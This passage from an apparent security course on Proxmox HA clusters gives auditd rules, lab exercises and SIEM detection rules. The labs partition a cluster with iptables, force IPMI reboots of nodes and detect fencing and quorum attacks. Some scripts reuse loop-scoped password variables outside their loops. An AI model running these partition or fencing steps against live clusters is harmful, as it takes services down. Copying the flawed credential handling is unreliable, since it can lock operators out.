-w /etc/pve/ha/ -p wa -k ha_pve_config
-w /etc/pve/corosync.conf -p wa -k ha_corosync_pve

# Fencing configuration
-w /etc/pve/ha/fence.cfg -p wa -k ha_fence_config

# Cluster management tools
-w /usr/bin/pvecm -p x -k ha_pvecm_exec
-w /usr/bin/ha-manager -p x -k ha_manager_exec
-w /usr/sbin/corosync-quorumtool -p x -k ha_quorum_tool

# Watchdog configuration
-w /etc/default/pve-ha-manager -p wa -k ha_watchdog_config
EOF
augenrules --load

# 2. Forward audit events to SIEM (audisp-remote or auditbeat)
# /etc/audisp/plugins.d/au-remote.conf
cat << 'EOF' > /etc/audisp/plugins.d/au-remote.conf
active = yes
direction = out
path = /sbin/audisp-remote
type = always
format = string
EOF

# 3. Verify audit log integrity with signed timestamps
# Use ausearch to query specific HA events:
ausearch -k ha_corosync_config --start today -i
ausearch -k ha_authkey_access --start today -i
ausearch -k ha_fence_config --start today -i
```

---

## 10. Lab Exercises

### Exercise 1: Set Up Encrypted Corosync with HMAC Authentication

**Objective:** Configure a 3-node Proxmox cluster with full Corosync encryption and verify that unencrypted communication is impossible.

**Prerequisites:**
- 3 VMs or physical nodes running Proxmox VE 8.x
- Isolated lab network (VLAN or separate switch)
- No production workloads

**Steps:**

```bash
# === NODE 1 (Initial cluster creation) ===

# Step 1: Create cluster with encryption enabled
pvecm create lab-secure-cluster

# Step 2: Verify authkey was generated
ls -la /etc/corosync/authkey
# Expected: -r-------- 1 root root 128 <date> /etc/corosync/authkey

# Step 3: Verify encryption is configured
grep -E "crypto_cipher|crypto_hash" /etc/corosync/corosync.conf
# Expected:
#   crypto_cipher: aes256
#   crypto_hash: sha256

# If NOT present (older Proxmox or manual cluster):
# Edit /etc/corosync/corosync.conf — add in totem {} block:
#   crypto_cipher: aes256
#   crypto_hash: sha256

# Step 4: Get join information for other nodes
pvecm add $(hostname -I | awk '{print $1}') --print-join-info

# === NODE 2 and NODE 3 ===

# Step 5: Join cluster (this distributes authkey automatically)
pvecm add 10.10.100.11  # IP of Node 1

# === VERIFICATION ON ANY NODE ===

# Step 6: Verify cluster status
pvecm status
corosync-quorumtool -s

# Step 7: Verify encryption is active — capture traffic
# On Node 1 (requires tcpdump):
apt install -y tcpdump
tcpdump -i ens1 -c 50 -w /tmp/corosync_encrypted.pcap port 5405

# Step 8: Analyze capture — should show NO readable Totem headers
tcpdump -r /tmp/corosync_encrypted.pcap -X | head -50
# All payload should be opaque (encrypted)
# NO occurrence of known Totem header patterns

# Step 9: Attempt to sniff from outside cluster
# On a machine on the same VLAN but not in the cluster:
tcpdump -i eth0 -c 50 port 5405 -X
# Confirm: all packets are encrypted, no cluster state leakage

# === NEGATIVE TEST: Verify rogue node cannot join ===

# Step 10: On a non-cluster machine, try to join without authkey
# This MUST fail:
pvecm add 10.10.100.11
# Expected error: authentication failure / connection refused

# Step 11: Document findings
echo "=== Lab 1 Complete ===" 
echo "Encryption: $(grep crypto_cipher /etc/corosync/corosync.conf)"
echo "Hash: $(grep crypto_hash /etc/corosync/corosync.conf)"
echo "Nodes: $(pvecm nodes | tail -n +2 | wc -l)"
echo "Quorate: $(corosync-quorumtool -s | grep Quorate)"
```

**Expected Outcomes:**
- All Corosync traffic encrypted (AES-256)
- HMAC authentication prevents unauthorized message injection
- Rogue nodes cannot join without valid authkey
- Wireshark shows only encrypted UDP payloads on port 5405

---

### Exercise 2: Simulate Split-Brain and Observe/Detect the Condition

**Objective:** Create a controlled split-brain condition, observe its effects, and verify detection mechanisms trigger correctly.

**Prerequisites:**
- 3-node cluster from Exercise 1
- HA-managed test VM (non-production)
- Monitoring/alerting from Section 9 configured

**WARNING:** This exercise WILL cause service disruption. Only perform in isolated lab.

```bash
# === PREPARATION ===

# Step 1: Create test VM and enable HA
qm create 9001 --name split-brain-test --memory 512 --net0 virtio,bridge=vmbr0
qm start 9001
ha-manager set vm:9001 --state started --group lab-group

# Step 2: Verify VM is running and HA-managed
ha-manager status
qm status 9001

# Step 3: Enable quorum monitoring (from Section 9)
/usr/local/bin/quorum-security-monitor.sh &
MONITOR_PID=$!

# Step 4: Set up split-brain detection logging
journalctl -u corosync -f > /tmp/split-brain-log.txt &
JOURNAL_PID=$!

# === SIMULATE NETWORK PARTITION ===

# Step 5: On Node 1, block Corosync traffic to Nodes 2 and 3
# This simulates a network failure isolating Node 1
iptables -A OUTPUT -p udp --dport 5405 -d 10.10.100.12 -j DROP
iptables -A OUTPUT -p udp --dport 5405 -d 10.10.100.13 -j DROP
iptables -A INPUT -p udp --sport 5405 -s 10.10.100.12 -j DROP
iptables -A INPUT -p udp --sport 5405 -s 10.10.100.13 -j DROP

# Step 6: Observe behavior on Node 1 (partitioned)
# Wait 30-60 seconds for token timeout
sleep 60
corosync-quorumtool -s
# Expected: "Quorate: No" on Node 1 (1 vote < quorum of 2)

# Step 7: Observe behavior on Nodes 2+3 (majority partition)
# On Node 2:
ssh root@10.10.100.12 "corosync-quorumtool -s"
# Expected: "Quorate: Yes" (2 votes >= quorum of 2)
# Node 1 shown as "member left"

# Step 8: Check HA behavior
# On Node 2 (in quorate partition):
ssh root@10.10.100.12 "ha-manager status"
# VM 9001 should be fenced from Node 1 and restarted on Node 2 or 3

# Step 9: Check watchdog behavior on Node 1
# If watchdog is active, Node 1 should self-fence (reboot)
# Check dmesg for watchdog timeout:
dmesg | grep -i watchdog

# === OBSERVE DETECTION ===

# Step 10: Check that monitoring detected the event
cat /tmp/split-brain-log.txt | grep -E "left|partition|quorum"
# Check syslog for quorum monitor alerts
journalctl -t quorum-security | tail -20

# === RECOVERY ===

# Step 11: Remove iptables rules (restore connectivity)
iptables -D OUTPUT -p udp --dport 5405 -d 10.10.100.12 -j DROP
iptables -D OUTPUT -p udp --dport 5405 -d 10.10.100.13 -j DROP
iptables -D INPUT -p udp --sport 5405 -s 10.10.100.12 -j DROP
iptables -D INPUT -p udp --sport 5405 -s 10.10.100.13 -j DROP

# Step 12: Wait for cluster to reform
sleep 30
pvecm status  # Should show 3 nodes again
corosync-quorumtool -s  # Should show all votes present

# Step 13: Verify VM state after recovery
ha-manager status
qm status 9001

# === CLEANUP ===
kill $MONITOR_PID $JOURNAL_PID 2>/dev/null
ha-manager remove vm:9001
qm stop 9001 && qm destroy 9001
```

**Expected Outcomes:**
- Node 1 loses quorum within Corosync token timeout (~6-12 seconds)
- Nodes 2+3 maintain quorum and continue operating
- HA migrates VM 9001 away from partitioned Node 1
- Watchdog triggers self-fence on Node 1 (if hardware watchdog configured)
- Monitoring scripts generate critical alerts
- After network restoration, cluster reforms automatically

---

### Exercise 3: Secure Fencing Devices with Isolated VLAN + Credential Rotation

**Objective:** Implement a secure fencing architecture with dedicated VLAN, restricted credentials, and automated rotation.

**Prerequisites:**
- 3-node cluster with IPMI-capable hardware (or virtual BMC for lab)
- Managed switch with VLAN capability
- Dedicated network ports for BMC/IPMI

```bash
# === NETWORK SETUP ===

# Step 1: Create dedicated fencing VLAN (VLAN 50)
# On managed switch (example — adapt to your hardware):
# vlan 50
#   name FENCING
#   state active
# interface range GigabitEthernet0/10-12
#   switchport mode access
#   switchport access vlan 50
#   spanning-tree bpduguard enable
#   storm-control broadcast level 5
#   no cdp enable

# Step 2: Configure BMC network on each node to use VLAN 50
# Via IPMI (example for Node 1):
ipmitool -I lanplus -H 172.16.50.11 -U admin -P "$DEFAULT_PASS" \
    lan set 1 ipsrc static
ipmitool -I lanplus -H 172.16.50.11 -U admin -P "$DEFAULT_PASS" \
    lan set 1 ipaddr 172.16.50.11
ipmitool -I lanplus -H 172.16.50.11 -U admin -P "$DEFAULT_PASS" \
    lan set 1 netmask 255.255.255.0
# NO default gateway — fencing network is isolated

# Step 3: Verify connectivity from cluster nodes to BMCs
for bmc in 172.16.50.{11,12,13}; do
    ping -c 1 -W 2 $bmc && echo "$bmc reachable" || echo "$bmc UNREACHABLE"
done

# === CREDENTIAL HARDENING ===

# Step 4: Create dedicated fencing user with minimal privileges
for BMC in 172.16.50.{11,12,13}; do
    # Generate unique password per BMC
    FENCE_PASS=$(openssl rand -base64 24 | tr -d '/+=' | cut -c1-20)
    
    # Create user (slot 3, to avoid default admin in slot 2)
    ipmitool -I lanplus -H "$BMC" -U admin -P "$DEFAULT_PASS" \
        user set name 3 pve_fence
    ipmitool -I lanplus -H "$BMC" -U admin -P "$DEFAULT_PASS" \
        user set password 3 "$FENCE_PASS"
    # Set privilege to Operator (level 3) — can power on/off but not reconfigure
    ipmitool -I lanplus -H "$BMC" -U admin -P "$DEFAULT_PASS" \
        user priv 3 3 1
    ipmitool -I lanplus -H "$BMC" -U admin -P "$DEFAULT_PASS" \
        user enable 3
    
    # Store credential securely (example using pass/gpg):
    echo "$FENCE_PASS" | gpg --encrypt -r security-team@company.com \
        > "/root/secrets/fence-${BMC}.gpg"
    
    echo "BMC $BMC configured with fence user"
done

# Step 5: Disable default admin account (or change password)
for BMC in 172.16.50.{11,12,13}; do
    NEW_ADMIN_PASS=$(openssl rand -base64 32)
    ipmitool -I lanplus -H "$BMC" -U admin -P "$DEFAULT_PASS" \
        user set password 2 "$NEW_ADMIN_PASS"
    echo "$NEW_ADMIN_PASS" | gpg --encrypt -r security-team@company.com \
        > "/root/secrets/admin-${BMC}.gpg"
done

# Step 6: Disable cipher suite 0 (unauthenticated IPMI)
for BMC in 172.16.50.{11,12,13}; do
    ipmitool -I lanplus -H "$BMC" -U admin -P "$NEW_ADMIN_PASS" \
        raw 0x0c 0x01 0x01 0x08 0x04 0x00 0x00 0x00
done

# === PROXMOX FENCING CONFIGURATION ===

# Step 7: Configure fencing in Proxmox HA
# /etc/pve/ha/fence.cfg
cat << 'EOF' > /etc/pve/ha/fence.cfg
# Fencing configuration — IPMI via isolated VLAN 50
fence: pve1
    agent fence_ipmilan
    ipaddr 172.16.50.11
    login pve_fence
    passwd <encrypted-ref>
    lanplus 1
    power_wait 5
    delay 0
    method onoff

fence: pve2
    agent fence_ipmilan
    ipaddr 172.16.50.12
    login pve_fence
    passwd <encrypted-ref>
    lanplus 1
    power_wait 5
    delay 0
    method onoff

fence: pve3
    agent fence_ipmilan
    ipaddr 172.16.50.13
    login pve_fence
    passwd <encrypted-ref>
    lanplus 1
    power_wait 5
    delay 0
    method onoff
EOF

# Step 8: Test fencing (non-destructive — status check only)
fence_ipmilan -a 172.16.50.12 -l pve_fence -p "$FENCE_PASS" -o status --lanplus
# Expected output: "Status: ON"

# === CREDENTIAL ROTATION ===

# Step 9: Automated credential rotation script
cat << 'ROTEOF' > /usr/local/sbin/rotate-fence-creds.sh
#!/bin/bash
# Rotate fencing credentials quarterly
# Run via: systemd timer or cron
set -euo pipefail

LOG_TAG="fence-rotate"
BMCS=(172.16.50.11 172.16.50.12 172.16.50.13)
USER="pve_fence"
USER_SLOT=3

for BMC in "${BMCS[@]}"; do
    # Read current password from encrypted store
    OLD_PASS=$(gpg --quiet --decrypt "/root/secrets/fence-${BMC}.gpg")
    
    # Generate new password
    NEW_PASS=$(openssl rand -base64 24 | tr -d '/+=' | cut -c1-20)
    
    # Update BMC
    if ipmitool -I lanplus -H "$BMC" -U "$USER" -P "$OLD_PASS" \
        user set password "$USER_SLOT" "$NEW_PASS"; then
        
        # Verify new credential works
        if ipmitool -I lanplus -H "$BMC" -U "$USER" -P "$NEW_PASS" \
            chassis status > /dev/null 2>&1; then
            
            # Store new password
            echo "$NEW_PASS" | gpg --encrypt -r security-team@company.com \
                > "/root/secrets/fence-${BMC}.gpg"
            logger -t "$LOG_TAG" "SUCCESS: Rotated fence credential for $BMC"
        else
            logger -p auth.crit -t "$LOG_TAG" "FAILED: New credential doesn't work for $BMC"
            # Rollback
            ipmitool -I lanplus -H "$BMC" -U "$USER" -P "$NEW_PASS" \
                user set password "$USER_SLOT" "$OLD_PASS"
        fi
    else
        logger -p auth.crit -t "$LOG_TAG" "FAILED: Cannot update credential on $BMC"
    fi
done

# Update Proxmox fencing config with new credentials
# (Implementation depends on how passwords are referenced in fence.cfg)
ROTEOF
chmod 0700 /usr/local/sbin/rotate-fence-creds.sh

# Step 10: Schedule rotation
cat << 'EOF' > /etc/systemd/system/fence-cred-rotation.timer
[Unit]
Description=Quarterly Fencing Credential Rotation

[Timer]
OnCalendar=*-01,04,07,10-01 03:00:00
Persistent=true

[Install]
WantedBy=timers.target
EOF
systemctl enable fence-cred-rotation.timer

# === VERIFICATION ===

# Step 11: Verify fencing works end-to-end
# (WARNING: This will reboot a node — only in lab!)
# On Node 1, fence Node 2:
fence_ipmilan -a 172.16.50.12 -l pve_fence -p "$FENCE_PASS" -o reboot --lanplus
# Node 2 should reboot and rejoin cluster automatically

# Step 12: Verify network isolation
# From a non-fencing VLAN, attempt to reach BMCs:
ping -c 1 -W 2 172.16.50.11
# Expected: Destination unreachable (VLAN isolation working)
```

**Expected Outcomes:**
- BMCs accessible only from cluster nodes on VLAN 50
- Dedicated fence user with Operator-only privileges
- Default admin account secured with rotated strong password
- Cipher suite 0 disabled (no unauthenticated IPMI access)
- Automated quarterly credential rotation with verification
- Fencing functional end-to-end through isolated network path

---

### Exercise 4: Build SIEM Rules for HA Manipulation Detection

**Objective:** Create detection rules that identify the specific attack patterns described in this module, suitable for Elasticsearch/OpenSearch, Splunk, or Wazuh SIEM platforms.

**Prerequisites:**
- SIEM platform operational (Elasticsearch + Kibana, Splunk, or Wazuh)
- Log forwarding from cluster nodes configured (Exercise 3, Section 9)
- Alerting channel configured (email, Slack, PagerDuty)

```bash
# === DETECTION RULE 1: Quorum Vote Manipulation ===

# Elasticsearch Watcher (Kibana Alerting)
cat << 'EOF' > /tmp/siem-rule-quorum-manipulation.json
{
  "trigger": {
    "schedule": { "interval": "30s" }
  },
  "input": {
    "search": {
      "request": {
        "indices": ["proxmox-cluster-*"],
        "body": {
          "query": {
            "bool": {
              "must": [
                {"range": {"@timestamp": {"gte": "now-60s"}}},
                {"bool": {
                  "should": [
                    {"match_phrase": {"message": "members joined"}},
                    {"match_phrase": {"message": "new configuration"}},
                    {"match_phrase": {"message": "total votes changed"}}
                  ]
                }}
              ]
            }
          }
        }
      }
    }
  },
  "condition": {
    "compare": { "ctx.payload.hits.total.value": { "gt": 0 } }
  },
  "actions": {
    "notify_security": {
      "webhook": {
        "method": "POST",
        "url": "https://alertmanager.internal/api/v1/alerts",
        "body": "{\"alertname\":\"QuorumManipulation\",\"severity\":\"critical\",\"details\":\"{{ctx.payload.hits.hits.0._source.message}}\"}"
      }
    }
  }
}
EOF

# === DETECTION RULE 2: Fencing Attack Pattern ===
# (Multiple fences in short period from same initiator)

cat << 'EOF' > /tmp/siem-rule-fencing-attack.json
{
  "trigger": {
    "schedule": { "interval": "30s" }
  },
  "input": {
    "search": {
      "request": {
        "indices": ["proxmox-cluster-*"],
        "body": {
          "size": 0,
          "query": {
            "bool": {
              "must": [
                {"range": {"@timestamp": {"gte": "now-5m"}}},
                {"match_phrase": {"message": "fencing node"}}
              ]
            }
          },
          "aggs": {
            "fence_count": {
              "value_count": { "field": "@timestamp" }
            }
          }
        }
      }
    }
  },
  "condition": {
    "compare": { "ctx.payload.aggregations.fence_count.value": { "gt": 1 } }
  },
  "actions": {
    "page_oncall": {
      "webhook": {
        "method": "POST",
        "url": "https://pagerduty.internal/trigger",
        "body": "{\"title\":\"MULTIPLE FENCING EVENTS - POSSIBLE ATTACK\",\"severity\":\"critical\",\"count\":\"{{ctx.payload.aggregations.fence_count.value}}\"}"
      }
    }
  }
}
EOF

# === DETECTION RULE 3: Unauthorized HA Config Change ===

cat << 'EOF' > /tmp/siem-rule-ha-config-change.json
{
  "trigger": {
    "schedule": { "interval": "60s" }
  },
  "input": {
    "search": {
      "request": {
        "indices": ["proxmox-audit-*"],
        "body": {
          "query": {
            "bool": {
              "must": [
                {"range": {"@timestamp": {"gte": "now-120s"}}},
                {"bool": {
                  "should": [
                    {"match": {"audit.key": "ha_corosync_config"}},
                    {"match": {"audit.key": "ha_pve_config"}},
                    {"match": {"audit.key": "ha_fence_config"}},
                    {"match": {"audit.key": "ha_watchdog_config"}}
                  ]
                }}
              ],
              "must_not": [
                {"match": {"audit.user": "root"}},
                {"terms": {"source.ip": ["10.0.1.100"]}}
              ]
            }
          }
        }
      }
    }
  },
  "condition": {
    "compare": { "ctx.payload.hits.total.value": { "gt": 0 } }
  },
  "actions": {
    "alert": {
      "webhook": {
        "method": "POST",
        "url": "https://alertmanager.internal/api/v1/alerts",
        "body": "{\"alertname\":\"UnauthorizedHAConfigChange\",\"severity\":\"high\",\"user\":\"{{ctx.payload.hits.hits.0._source.audit.user}}\",\"key\":\"{{ctx.payload.hits.hits.0._source.audit.key}}\"}"
      }
    }
  }
}
EOF

# === DETECTION RULE 4: Split-Brain Indicator ===
# Detect when same VM appears running on multiple nodes

cat << 'EOF' > /tmp/siem-rule-dual-activation.sh
#!/bin/bash
# Run every 30 seconds — detects dual-activation (split-brain consequence)
# This is a CRITICAL safety check

declare -A VM_NODES

for node in pve1 pve2 pve3; do
    RUNNING_VMS=$(ssh -o ConnectTimeout=5 root@$node "qm list 2>/dev/null | awk 'NR>1 && \$3==\"running\"{print \$1}'" 2>/dev/null)
    for vmid in $RUNNING_VMS; do
        if [[ -n "${VM_NODES[$vmid]:-}" ]]; then
            # VM running on multiple nodes — SPLIT-BRAIN DETECTED
            logger -p auth.emerg "SPLIT-BRAIN DETECTED: VM $vmid running on BOTH ${VM_NODES[$vmid]} AND $node"
            # Immediate alert — this is a data-corruption emergency
            curl -s -X POST "https://pagerduty.internal/trigger" \
                -H "Content-Type: application/json" \
                -d "{\"title\":\"EMERGENCY: SPLIT-BRAIN - VM $vmid on multiple nodes\",\"severity\":\"critical\"}"
        else
            VM_NODES[$vmid]=$node
        fi
    done
done
EOF
chmod +x /tmp/siem-rule-dual-activation.sh

# === DETECTION RULE 5: IPMI Authentication from Unexpected Source ===

# Wazuh rule (OSSEC-compatible):
cat << 'EOF' > /tmp/wazuh-rule-ipmi-auth.xml
<group name="ipmi,authentication,">
  <rule id="100501" level="12">
    <decoded_as>ipmi</decoded_as>
    <match>Authentication attempt</match>
    <srcip_not>172.16.50.11|172.16.50.12|172.16.50.13</srcip_not>
    <description>IPMI authentication from unauthorized source IP</description>
    <group>authentication_failed,</group>
    <options>alert_by_email</options>
  </rule>

  <rule id="100502" level="14" frequency="3" timeframe="300">
    <if_matched_sid>100501</if_matched_sid>
    <description>Multiple IPMI auth attempts from unauthorized source - possible credential brute-force on fencing device</description>
    <group>authentication_failures,</group>
  </rule>
</group>
EOF

# === TESTING THE RULES ===

# Step 1: Generate test events to verify detection
# (Run in lab only)

# Test Rule 1 — simulate membership change log entry:
logger -p local0.info "corosync: members joined: nodeid 4"

# Test Rule 2 — simulate multiple fencing events:
logger -p local0.warning "ha-manager: fencing node 'pve2'"
sleep 2
logger -p local0.warning "ha-manager: fencing node 'pve3'"

# Test Rule 3 — touch HA config file:
touch /etc/pve/ha/groups.cfg  # Should trigger auditd → SIEM

# Step 2: Verify alerts fire in SIEM
# Check Kibana → Alerting → Alert history
# Check PagerDuty/Slack for notifications
# Verify alert contains useful context (which node, what changed, who)

# Step 3: Tune false positives
# Expected false positives:
# - Planned maintenance (node addition/removal)
# - Legitimate fencing during hardware failure
# - Authorized HA config changes
# Use maintenance windows or suppress rules during change management tickets
```

**Expected Outcomes:**
- 5+ detection rules covering the primary HA attack patterns
- Real-time alerting (< 60 seconds from event to notification)
- Low false-positive rate with proper tuning
- Dual-activation detection as a last-resort safety net
- Full audit trail of all HA-related configuration changes

---

## Summary — HA Security Hardening Checklist

| # | Control | Priority | Reference |
|---|---------|----------|-----------|
| 1 | Corosync encryption enabled (AES-256 + SHA-256 HMAC) | CRITICAL | Section 1.1 |
| 2 | Cluster network on dedicated VLAN, no default gateway | CRITICAL | Section 1.3 |
| 3 | Authkey permissions 0400 root:root, integrity monitored | CRITICAL | Section 1.1 |
| 4 | Fencing network isolated (dedicated VLAN, no routing) | CRITICAL | Section 2.1 |
| 5 | IPMI cipher suite 0 disabled | HIGH | Section 2.1 |
| 6 | Dedicated fencing user with Operator-only privilege | HIGH | Section 2.1 |
| 7 | Fencing credential rotation (quarterly minimum) | HIGH | Exercise 3 |
| 8 | Hardware watchdog enabled (ipmi_watchdog preferred) | CRITICAL | Section 6.5 |
| 9 | Quorum monitoring with real-time alerting | HIGH | Section 9.3 |
| 10 | Redundant Corosync links on separate physical paths | HIGH | Section 3.2 |
| 11 | QDevice on hardened host with restricted network access | MEDIUM | Section 3.3 |
| 12 | HA config files under auditd monitoring | HIGH | Section 9.4 |
| 13 | DRS/HA rules reviewed quarterly for unauthorized changes | MEDIUM | Section 5.2 |
| 14 | Replication traffic encrypted (TLS 1.2+) | CRITICAL | Section 8.2 |
| 15 | RPO compliance monitoring with alerting | HIGH | Section 8.3 |
| 16 | Backup integrity verification before DR activation | CRITICAL | Section 8.4 |
| 17 | VIP networks protected against ARP spoofing (DAI or static) | HIGH | Section 7.1 |
| 18 | VRRP replaced with unicast + IPsec or TLS-based failover | MEDIUM | Section 7.2 |
| 19 | SIEM rules for HA attack pattern detection | HIGH | Exercise 4 |
| 20 | Dual-activation detection script running continuously | CRITICAL | Exercise 4 |

---

## References and Further Reading

- Corosync 3.x documentation: cluster communication and crypto configuration
- Proxmox VE HA documentation: resource management, fencing, groups
- VMware vSphere HA architecture: FDM, heartbeats, isolation response
- CIS Benchmarks for ESXi 7.0/8.0: cluster security controls
- DISA STIG for vSphere: HA-specific requirements
- IPMI 2.0 Specification (RAKP vulnerability): Intel/DMTF documentation
- CVE-2013-4786: IPMI Authentication Bypass
- NIST SP 800-125A: Security Recommendations for Hypervisor Deployment
- RFC 5798: Virtual Router Redundancy Protocol (VRRPv3)
- Kronosnet documentation: knet transport encryption
- MITRE ATT&CK: T1489 (Service Stop), T1078 (Valid Accounts), T1557 (ARP Poisoning)
- Pacemaker/Corosync Security Advisories
- VMware Security Advisories (VMSA) for HA-related CVEs
